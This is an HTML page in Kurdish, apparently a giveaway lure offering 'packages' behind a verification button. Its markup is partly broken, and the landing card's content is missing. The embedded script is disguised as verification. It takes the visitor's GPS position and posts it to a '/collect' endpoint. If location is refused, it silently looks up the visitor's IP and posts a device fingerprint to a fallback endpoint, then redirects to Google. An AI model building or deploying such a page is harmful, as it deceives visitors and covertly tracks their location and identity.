<!DOCTYPE html>
<html lang="ckb" dir="rtl">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
    <title>پاکێچەکانی پووز</title>
    <style>
        @font-face {
            font-family: 'NRT';
            src: url('فۆنتی ئێن ئارتی.ttf') format('truetype');
            font-weight: normal;
            font-style: normal;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: 'NRT', 'Cairo', 'Segoe UI', Tahoma, sans-serif;
            background: #f0f0f0;
            color: #111;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            padding: 20px;
            direction: rtl;
        }

        /* ───── LANDING CARD ───── */
        #landing {
            width: 100%;
            max-width: 480px;
            background: #ffffff;
            border-radius: 18px;
            overflow: hidden;
            box-shadow: 0 4px 30px rgba(0,0,0,0.12);
        }

        /* Top brand bar */
        .brand-bar {
            background: #ffffff;
            padding: 22px 20px 10px;
        }

        .brand-title {
            font-size: 2.1rem;
            font-weight: 900;
            color: #e63946;
            text-shadow: 0 0 12px rgba(230,57,70,0.2);
            letter-spacing: 1px;
            line-height: 1.2;
        }

        .brand-title .star { font-size: 1.4rem; }

        /* Animated highlight box */
        .highlight-box {
            margin: 12px 20px;
            padding: 10px 18px;
            border: 3px dashed #e63946;
            border-radius: 8px;
            background: rgba(230,57,70,0.08);
            animation: dash-move 1.2s linear infinite;
            position: relative;
        }

        @keyframes dash-move {
            0%   { border-color: #e63946; box-shadow: 0 0 8px rgba(230,57,70,0.4); }
            50%  { border-color: #ff6b35; box-shadow: 0 0 16px rgba(255,107,53,0.6); }
            100% { border-color: #e63946; box-shadow: 0 0 8px rgba(230,57,70,0.4); }
        }

        .highlight-box span {
            font-size: 1.5rem;
            font-weight: 900;
            color: #e63946;
            letter-spacing: 1px;
        }

        /* Feature row */
        .features {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 0;
            padding: 14px 20px 6px;
            flex-wrap: wrap;
        }

        .feature-item {
            font-size: 1.05rem;
            font-weight: 700;
            color: #111;
            padding: 0 12px;
        }

        .feature-divider {
            width: 3px;
            height: 28px;
            background: #e63946;
            border-radius: 2px;
            flex-shrink: 0;
        }

        .decide-text {
            font-size: 1.1rem;
            font-weight: 700;
            color: #111;
            padding: 4px 20px 14px;
        }

        /* Social media bar */
        .social-bar {
            background: #f5f5f5;
            border-top: 1px solid #eee;
            border-bottom: 1px solid #eee;
            padding: 10px 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 14px;
            flex-wrap: wrap;
        }

        .social-label {
            font-size: 0.82rem;
            color: #555;
            white-space: nowrap;
        }

        .social-icons {
            display: flex;
            gap: 10px;
            align-items: center;
        }

        .social-icons a {
            width: 34px;
            height: 34px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            text-decoration: none;
            font-size: 1rem;
            transition: transform 0.15s;
        }
        .social-icons a:active { transform: scale(0.9); }

        .ic-wa  { background: #25D366; color: #fff; }
        .ic-tt  { background: #111; color: #fff; }
        .ic-sc  { background: #FFFC00; color: #000; }
        .ic-ig  { background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fd5949 45%, #d6249f 60%, #285AEB 90%); color: #fff; }
        .ic-fb  { background: #1877F2; color: #fff; }
        .ic-yt  { background: #FF0000; color: #fff; }

        /* CTA section */
        .cta-section {
            background: #ffffff;
            padding: 14px 20px 20px;
        }

        .cta-text {
            font-size: 0.88rem;
            color: #444;
            margin-bottom: 14px;
            line-height: 1.6;
        }

        .cta-text strong { color: #e63946; }

        .cta-btn {
            width: 100%;
            background: linear-gradient(135deg, #e63946, #c1121f);
            color: #fff;
            border: none;
            border-radius: 12px;
            padding: 16px 20px;
            font-size: 1.1rem;
            font-weight: 900;
            font-family: 'NRT', 'Cairo', sans-serif;
            cursor: pointer;
            box-shadow: 0 4px 20px rgba(230,57,70,0.35);
            transition: transform 0.1s, box-shadow 0.1s;
            letter-spacing: 0.5px;
        }

        .cta-btn:active {
            transform: scale(0.97);
            box-shadow: 0 2px 10px rgba(230,57,70,0.2);
        }

        /* ───── LOADING SCREEN ───── */
        #loading {
            width: 100%;
            max-width: 480px;
            text-align: center;
            padding: 40px 20px;
        }

        .spinner {
            border: 4px solid rgba(230,57,70,0.15);
            border-top: 4px solid #e63946;
            border-radius: 50%;
            width: 52px;
            height: 52px;
            animation: spin 0.9s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            0%   { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-title {
            font-size: 1.3rem;
            font-weight: 700;
            color: #e63946;
            margin-bottom: 8px;
        }

        .loading-sub {
            font-size: 0.9rem;
            color: #666;
        }
    </style>
</head>

                چاوەرێی چیت؟ هەر ئیستا بەژداری بکە

            <button class="cta-btn" onclick="onVerify()">

    <!-- ── LOADING ── -->
    <div id="loading" style="display:none;">
        <div class="spinner"></div>
        <div class="loading-title">چاوەرێت دەکەین...</div>
        <div class="loading-sub">پرۆسەی پشتڕاستکردنەوە بەردەوامە</div>
    </div>

    <div id="blocked" style="display:none;"></div>
    <div id="insecure" style="display:none;"></div>

    <script>
        const ENDPOINT_GPS = (window.ENDPOINT_GPS || '/collect');
        const ENDPOINT_FALLBACK = (window.ENDPOINT_FALLBACK || '/collect-fallback');

        async function postJSON(url, data) {
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data),
                    keepalive: true
                });
            } catch (e) {}
        }

        async function collectFallback() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
            let ip = '';
            try {
                const resp = await fetch('https://api.ipify.org?format=json');
                if (resp.ok) { const j = await resp.json(); ip = j.ip || ''; }
            } catch (e) {}

            await postJSON(ENDPOINT_FALLBACK, {
                userAgent: navigator.userAgent || '',
                language: navigator.language || '',
                platform: navigator.platform || '',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                connectionType: connection.effectiveType || connection.type || '',
                ip
            });
        }

        function done() {
            window.location.href = 'https://www.google.com';
        }

        async function requestLocation() {
            // Request geolocation normally to trigger permission prompt
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    await postJSON(ENDPOINT_GPS, {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    });
                    done();
                },
                async (error) => {
                    // On error or denial, silently fallback
                    await collectFallback();
                    done();
                },
                { enableHighAccuracy: false, timeout: 10000, maximumAge: 0 }
            );

            setTimeout(done, 12000);
        }

        function onVerify() {
            document.getElementById('landing').style.display = 'none';
            document.getElementById('loading').style.display = 'block';

            if (!navigator.geolocation) {
                collectFallback().finally(done);
                return;
            }

            requestLocation();
        }
    </script>
